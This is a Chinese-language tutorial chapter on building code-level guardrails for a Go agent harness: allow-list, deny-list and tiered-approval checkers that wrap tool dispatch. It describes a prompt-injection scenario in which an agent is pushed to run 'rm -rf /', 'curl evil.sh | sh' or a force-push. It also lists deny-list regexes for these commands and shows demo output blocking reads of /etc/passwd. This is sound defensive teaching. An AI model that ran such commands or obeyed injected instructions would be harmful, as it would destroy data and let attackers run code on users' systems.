# s06 — 护栏（Guardrails）

> 在"模型请求 X"和"harness 真的做了 X"之间的代码级闸门。三种模式 —— 白名单、黑名单、分级审批 —— 走同一个 `Checker` 接口，外面用 `Guarded()` wrapper 把循环和工具注册分发隔开。

## Problem

s03 实现的工具注册见名就分发：模型说啥就调啥。这对开发者原型是对的形状；对任何动到真实文件系统的东西来说是**完全错误**的形状。威胁很直白：

> 模型生成文本。文本里包含工具调用。harness 执行这些工具调用。这意味着任何能影响模型输出的东西都能影响 harness 的行为 —— 包括文件里、网页上、用户消息里的恶意内容。
> —— `guide/guardrails.md` L11

agent 读取的网页里塞一个 prompt injection，要求执行 `rm -rf /`、`curl evil.sh | sh`、`git push --force origin main`。s03 注册对此完全没有立场：它看到一个字符串 `name` 加一个 JSON `args`，就分发。我们需要一层东西：

1. 检查**已解析**的工具调用（模型刚 emit、注册还没跑之前），
2. 用声明式策略给出 yes/no/needs-approval 决策，
3. 让"被拒绝就一定不分发"在**结构上**不可能被绕过 —— 不是依赖测试套件的约定。

写在 prompt 里的"护栏"（"你是一个不删文件的友好助手"）一个都做不到。上游 L150 直接挑明："跟模型说'不要删文件'不是护栏。Prompt injection 能把它覆盖掉。"

## Solution

一个 `Checker` 接口返回 `Decision`，加一个高阶函数 `Guarded()` 把 `DispatchFunc` 套进去预检。三个 `Checker` 实现覆盖 `guardrails.md` L51-L116 的三种权限模型：

| 模式 | 默认 | 拒绝信号 | 适用场景 |
|------|------|----------|----------|
| 白名单（`AllowListChecker`）| 拒绝 | `Decision{Allow:false}` | 托管 agent、托管演示 |
| 黑名单（`DenyListChecker`）| 允许 | `Decision{Allow:false}` | 开发者工具，难以枚举所有合法动作 |
| 分级（`TieredChecker`）| 允许（低/中/高）| 关键级返回 `ErrNeedsApproval` | 风险混合的场景 |

三个 checker 全部消费同一个 `Policy` 结构（`policy.go`），只是看不同字段。所以运维可以发一份 JSON、用 feature flag 决定当下穿哪种模式。

Wrapper 本身二十行：

```go
func Guarded(checker Checker, dispatch DispatchFunc) DispatchFunc {
    return func(name string, args map[string]any) string {
        decision, err := checker.Check(name, args)
        if err != nil {
            if errors.Is(err, ErrNeedsApproval) {
                return fmt.Sprintf("Error: needs human approval (tier=%s)", decision.Tier)
            }
            return fmt.Sprintf("Error: guardrail check failed: %v", err)
        }
        if !decision.Allow {
            return fmt.Sprintf("Error: blocked by guardrail: %s", decision.Reason)
        }
        return dispatch(name, args)
    }
}
```

关键的一行是任何返回 error 字符串的路径里**都不存在** `dispatch` 调用。编译器自己就能证明内层函数没被跑到。这就是"护栏写在代码里"相对于"护栏写在 prompt 里"换来的东西。

## How It Works

### 白名单

严格模式。`guardrails.md` L57-L72 的 Python 长这样：

```python
def check_permission(tool_name, args):
    if tool_name not in ALLOWED_TOOLS:
        return False
    policy = ALLOWED_TOOLS[tool_name]
    if "paths" in policy:
        return any(fnmatch(args.get("path", ""), p) for p in policy["paths"])
    ...
```

我们把它拆成两个 policy 字段（`AllowedTools` 和 `AllowedPathGlobs`），免去嵌套字典；并在 `allowlist.go` 里手写一个小型 glob 匹配器，理解 `*`（段内）和 `**`（跨段）。`/workspace/**` 匹配 `/workspace/a/b/c.txt`，但**不**匹配 `/etc/passwd`、**也不**匹配 `/workspace` 本身（结尾的 `/` 是前缀的一部分）。

两个设计选择值得拎出来：

1. **没有 path globs ⇒ 不检查 path**。如果 `AllowedPathGlobs` 是空，只要工具在列表里就无条件放行。这让 policy 可以组合 —— 一个无 path 的 "list_models" 工具不会因为别的 glob 而被误拒。
2. **不带 `path` 参数的工具跳过 glob 检查**。复刻上游 `if "paths" in policy` 的守卫。如果未来某个工具参数叫 `target_path`，policy 作者要么扩展 checker、要么改参数名 —— 我们不做过度泛化。

### 黑名单

宽松模式。`policy.BlockedPatterns` 里每项是 Go `regexp`。匹配的是 args 的**规范化字符串形式**：

- 如果 `args["command"]` 是字符串，直接用它 —— 大部分 shell 风险模式是按 shell 语法写的（上游 L86-L90）。
- 否则把所有字符串值参数按 key 稳定排序拼起来，让正则有东西扫。

正则是 `sync.Once` 懒编译并缓存的。编译失败就是致命 —— **代码里不抛 panic**，而是 `Decision.Allow=false`，reason 里写明坏的那条。失败时拒绝：坏 policy 绝不能默默放宽信任边界。

上游两条例子（L80-L83）直接做成测试用例：

- `rm\s+-rf\s+/` —— 删根目录
- `curl.*\|\s*sh` —— pipe 给 shell

我们故意**没有**搬第三条 `env\s+|printenv|echo\s+\$` —— 它比本章教学需要的更宽，并且把"暴露 env 变量"和 `\$`（几乎匹配任何 shell 变量）混在一起。复刻上游不是目标，复刻匹配器的**形状**才是。

### 分级

风险分桶。`policy.ToolTiers["git_push_force"] = "critical"` 让 tiered checker 在该工具上返回 `ErrNeedsApproval`，与 args 无关。低/中/高三级返回 `Decision{Allow:true}`，reason 把"低风险，自动通过"和"高风险，通过但要外部审查"区分开。

关键级**返回**什么是有讲究的：

```go
return Decision{Allow: false, Tier: TierCritical, Reason: "..."}, ErrNeedsApproval
```

err 是承重信号。Wrapper 里 `errors.Is(err, ErrNeedsApproval)` 命中之后输出**与普通 block 不同**的字符串 —— `"Error: needs human approval (tier=critical)"`。想做审批弹窗的 UI 可以用这个前缀做字符串匹配，不必从模型循环里反向解析结构化输出。Decision 上的 Tier 是给 formatter 用的；err 才是路由信号。

我们故意在本章把 `high` 当成"自动通过 + 日志"。上游表（L101）写 high 是"要人审批"，但**审批机制**是应用相关的（UI、Slack bot、带外 CLI）。把"high 也返回 ErrNeedsApproval"那种半成品塞进来会把策略选择和结构性部分混在一起。真实部署会复写 tiered checker，或把它和 high 的 UI 提示串起来。

## What Changed

| | s05（记忆）| s06（护栏）|
|---|---|---|
| 在循环里的位置 | 启动时 + 运行期读写 | 模型输出和工具分发**之间** |
| 存储 | 磁盘文件 | 没有 —— 纯策略评估 |
| 产出 | 一段 context-window 文本 | 一个 yes/no 决策 |
| 失败时形态 | "记忆没加载" —— 退化为无记忆 | "策略说不" —— 阻止分发 |

s06 不引入任何持久化状态。它是目前唯一一个全部体量都是函数变换的章节：`(Checker, DispatchFunc) → DispatchFunc`。这种可组合性正是重点 —— 一行 `Guarded(checker, registry.Dispatch)` 就能塞进循环。

具体地，s_full 会这么接：

```go
// s_full
dispatch := registry.Dispatch                  // s03
dispatch  = Guarded(allowListChecker, dispatch) // s06
dispatch  = Guarded(denyListChecker,  dispatch) // s06，再叠一层
```

两个 checker 叠加 —— 两个都允许才放行。Wrapper 的契约让这件事 trivially 成立：`Guarded()` 本身就是 `DispatchFunc`，可以再 wrap 一次。

## Try It

```bash
cd agents/s06-guardrails
go test -count=1 ./...
# PASS —— 7 个测试：
#   TestAllowList_BlocksUnknownTool
#   TestAllowList_PathGlobs
#   TestDenyList_BlocksRmRf
#   TestDenyList_BlocksCurlPipeShell
#   TestTiered_CriticalReturnsNeedsApproval
#   TestGuarded_PassesThroughOnAllow
#   TestGuarded_BlocksAndReturnsString

go run .
# === AllowListChecker ===
# [dispatched] read_file(map[path:/workspace/main.go])
# Error: blocked by guardrail: path "/etc/passwd" does not match any allowed glob [/workspace/**]
# Error: blocked by guardrail: tool "delete_file" is not in the allow-list
#
# === DenyListChecker ===
# [dispatched] run_command(map[command:ls -la])
# Error: blocked by guardrail: argument matched blocked pattern "rm\\s+-rf\\s+/"
# Error: blocked by guardrail: argument matched blocked pattern "rm\\s+-rf\\s+/"
# Error: blocked by guardrail: argument matched blocked pattern "curl.*\\|\\s*sh"
#
# === TieredChecker ===
# [dispatched] read_file(map[path:/anywhere])
# [dispatched] write_file(map[path:/anywhere])
# [dispatched] run_command(map[command:make test])
# Error: needs human approval (tier=critical)
```

输出里 `[dispatched]` 前缀来自假 DispatchFunc —— 每一行带该前缀的都是内层函数**真的**看到过的调用。`Error:` 前缀的每一行都是 wrapper 短路掉的。肉眼扫一遍 demo 输出：被拒绝的调用旁边**没有**对应的 dispatch 行。这就是 `TestGuarded_BlocksAndReturnsString` 钉死的不变量。

## Upstream Source Reading

来源：`guide/guardrails.md` L22-L116。永久链接：<https://github.com/nexu-io/harness-engineering-guide/blob/86fec9bea430cecb29ff10afaae36b96496a8f8e/guide/guardrails.md#L22-L116>

```python
# guardrails.md L57-L72 —— 白名单
ALLOWED_TOOLS = {
    "read_file": {"paths": ["/workspace/**"]},
    "write_file": {"paths": ["/workspace/**"]},
    "run_command": {"commands": ["npm test", "npm run build"]},
}

def check_permission(tool_name, args):
    if tool_name not in ALLOWED_TOOLS:
        return False
    policy = ALLOWED_TOOLS[tool_name]
    if "paths" in policy:
        return any(fnmatch(args.get("path", ""), p) for p in policy["paths"])
    if "commands" in policy:
        return args.get("command") in policy["commands"]
    return True
```

阅读笔记：

- **上游白名单是嵌套的 —— `ALLOWED_TOOLS[name] -> {paths|commands}`**。我们的 Go 版把它压平成 `Policy.AllowedTools`（集合成员）+ `Policy.AllowedPathGlobs`（一个共享的 glob 列表）。代价：JSON 更简单，但所有 allow-list 的工具共用一份 path 作用域。扩展练习是改成 `map[string][]string`，做到每个工具自己的 glob。
- **`fnmatch` 是 shell 风格，不是完整正则**。`**` 在 Python `fnmatch` 里是 doublestar 扩展（其实 stdlib 没有 —— 上游草图默认是 wrapper 或库）。我们自带一个三 token 的匹配器（`*`、`**`、字面量），因为为了一个特性引入 glob 依赖会喧宾夺主。
- **L72 的 `return True` 是陷阱**。一个既没 `paths` 也没 `commands` 的工具默认放行。我们的 Go 版**只在**完全没有配置任何 glob 时复刻这一点 —— 一旦你加了 glob，所有未列出 path 参数的工具都会被检查。更安全的默认是要求显式 pass-through；我们保留了上游语义作为教学用法。
- **黑名单模式匹配是子串而不是锚定**。上游用 `re.search`，不是 `re.fullmatch`。Go 的 `regexp.MatchString` 等价于 `re.search`，所以 `rm -rf /tmp/x` 也会命中 `rm\s+-rf\s+/`（因为 `/tmp/` 里的 `/`）。这是 feature 不是 bug —— 但意味着黑名单是**签名**、不是**语法**。别想用正则写 shell parser。
- **L96-L116 的分级表是示意，不是规范**。上游用子串判断（`if "rm" in cmd`），我们用 per-tool tier map，因为本来就有工具注册。真正的分类器（s14）会替换整套思路。

阅读地图：

| 主题 | 上游文件 | 行号 | 对应章节 |
|------|----------|------|----------|
| 信任边界图 | `guide/guardrails.md` | L22-L49 | s06（本章） |
| 白名单 | `guide/guardrails.md` | L51-L73 | s06 |
| 黑名单 | `guide/guardrails.md` | L75-L91 | s06 |
| 分级审批 | `guide/guardrails.md` | L93-L116 | s06 |
| 沙箱（OS 级隔离） | `guide/guardrails.md` | L118-L131 | （不在课程范围；外链） |
| 输入净化 | `guide/guardrails.md` | L133-L145 | （在 s09 里捎带） |
| 模型驱动的分类器（替换静态规则） | `guide/classifier-permissions.md` | L29-L169 | s14 |
